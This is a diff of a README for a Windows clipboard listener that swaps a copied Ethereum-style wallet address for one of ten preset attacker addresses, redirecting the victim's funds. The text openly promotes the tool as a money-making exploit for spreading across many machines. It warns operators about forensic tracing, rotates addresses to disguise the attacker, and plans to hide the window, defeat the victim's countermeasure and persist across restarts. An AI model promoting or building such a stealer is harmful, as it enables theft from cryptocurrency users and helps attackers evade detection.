@@ -11,15 +11,15 @@
 
 
 ## CRYPTOCURRENCY BACKGROUND
-At the time of the write-up, Ethereum (ETH) was the second largest cryptocurrency based on  market capitalization, with the intent of
+At the time of the write-up, Ethereum (ETH) is the second largest cryptocurrency based on  market capitalization, with the intent of
 serving as a platform token for other coins to be developed from. From a technical view,
-this means that other cryptos who desire to mimic ETH's functionality must follow its interface known as the ERC20 protocol.
-As a direct result of following such standard, tokens that fulfill the ETH protocol/interface
-will have the same wallet address format that prefixes with 0x and is 42 characters long of randomly distributed alphanumeric text.
+this means that other cryptos who desire to mimic ETH's functionality must follow its interface known as the [ERC20](https://en.wikipedia.org/wiki/ERC-20) protocol.
+As a direct result of following such standard, tokens
+will have the same wallet address format that prefixes with _0x_ and is 42 characters long of alphanumeric text.
 This is where this listener exploit becomes advantageous.
 
-(FYI visit [ERC-20 Token List](https://eidoo.io/erc20-tokens-list) to see all ETH based cryptos.
-Viewing this list should open your eyes to the yield potency behind this exploit if it were to live on a vast number of machines)
+**_(FYI: visit [ERC-20 Token List](https://eidoo.io/erc20-tokens-list) to see all ETH based cryptos.
+Viewing this list should open your eyes to the yield potency behind this exploit if it were to live on a vast number of machines)_**
 
 
 
@@ -28,10 +28,10 @@ Viewing this list should open your eyes to the yield potency behind this exploit
 ## SUMMARY
 This application is a clipboard listener that swaps the client's wallet address
 with addresses that are declared within the program. If the host does not perform his/her due diligence
-and sends their eth-based crypto while this application is running, those assets will have routed to
+and sends their ETH-based crypto while this application is running, those assets will have routed to
 one of the 10 preset addresses permanently! Given the transparent nature of public blockchains, the victim
 will undoubtedly be able to see where their funds were transferred via block explorers such as [Blockchain.info](https://www.blockchain.com/explorer).
-As a warning, ramifications are not yet explored and there is a probability that there may exist
+As a warning, ramifications are not yet explored and there is a chance that there may exist
 some crypto forensic agency that can associate a wallet to an IP addresses so proceed with caution!!!
 
 
@@ -40,7 +40,7 @@ some crypto forensic agency that can associate a wallet to an IP addresses so pr
 
 ## COUNTERMEASURES IF INFECTED
 Aside from the obvious file removal, if infected, you can painstakingly type out your address when performing a transaction, or simply
-copy the address in parts.
+copy the address in parts. The latter being the most efficient option.
 
 
 
@@ -57,7 +57,7 @@ cd src/main/c#/scripts/powershell
 
 
 ## FEATURES
-    * light overhead (7KB file size that uses about 16-19% processor utilization with RAM usage recorded around 3.7MB)
+    * light overhead (7KB file size that was clocked using ~16-19% processor utilization with RAM usage recorded around 3.7MB)
 
     * randomization with 10 addresses in order to create the impression that host is being targeted by different bad actors
 
@@ -71,7 +71,7 @@ cd src/main/c#/scripts/powershell
  
 ## FUTURE IMPLEMENTATION
 - [X] [tested](https://github.com/KesMath/Windows_OS_Malware_Repo/blob/master/src/main/c%23/virus%20suite/crypto/notes/ClipboardLogger-12HR-Passive.rar) over 1.3 million iterations (~12 hrs) without no faults
-- [ ] remove or silence console window when running
+- [ ] turn into a daemon by silencing console window
 - [ ] remove logging writes to speed up performance
 - [ ] counter the countermeasure stated above
 - [ ] activation upon computer restart/shutdown
